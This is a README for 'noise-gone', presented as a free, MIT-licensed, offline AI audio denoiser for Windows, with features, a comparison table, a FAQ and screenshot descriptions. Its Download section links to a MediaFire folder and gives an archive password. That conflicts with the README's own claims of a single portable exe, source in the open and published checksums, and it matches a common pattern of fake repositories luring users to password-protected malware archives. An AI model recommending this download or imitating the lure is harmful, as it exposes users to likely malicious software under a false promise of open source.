# noise-gone

🔇 Free, open-source audio noise remover for Windows — local AI denoise for voice recordings, batch cleanup. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Local AI denoise** — fan hum, room tone and keyboard clatter removed with ONNX models on your machine
- ✅ **Noise profile learn** — select two seconds of pure noise and the filter targets that exact signature
- ✅ **Strength dial** — from subtle cleanup to aggressive extraction, with an A/B bypass button
- ✅ **Batch podcast cleanup** — a folder of episodes processed with identical settings
- ✅ **Voice and music modes** — speech-optimized or gentle mode that leaves room reverb natural
- ✅ **Waveform A and B** — original and cleaned waveforms stacked for instant comparison
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why noise-gone

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **noise-gone** | Adobe Podcast Enhance | Krisp | Audacity noise reduction |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free web, limits | Paid subscription | Free, OSS |
| Open source | **Yes** | No | No | Yes |
| Files stay local | **Yes** | Upload | Yes | Yes
| Batch episodes | **Yes** | One at a time | Calls only | Manual
| Noise profile learning | **Yes** | No | Auto only | Manual FFT
| Portable, no install | **Yes, 100 MB** | Browser | Installer | Installer

## FAQ

**how to remove background noise from recordings free, offline?**

Cloud enhancers upload every recording and cap free runs, and classic spectral tools need an audio engineer's patience. noise-gone learns your noise profile, denoises with local models and batches whole folders. It is a 100 MB portable exe, MIT, unlimited, with a bypass button so you can trust what it changed.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark audio view (#121417, cyan #06B6D4): stacked waveforms before and after, noise profile strip at the head, strength dial at 0.7, A-B bypass lit.
2. Batch panel: 38 episode files queued with minutes-saved column, voice mode badge, progress at 61 percent, folder destination chip.
3. Profile step: two-second selection highlighted on the waveform, learn button, noise signature mini-chart, apply-to-all checkbox enabled.

## Download

| Source | Link |
|---|---|
| 💾 **Installer noise-gone** | [Installer noise-gone](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).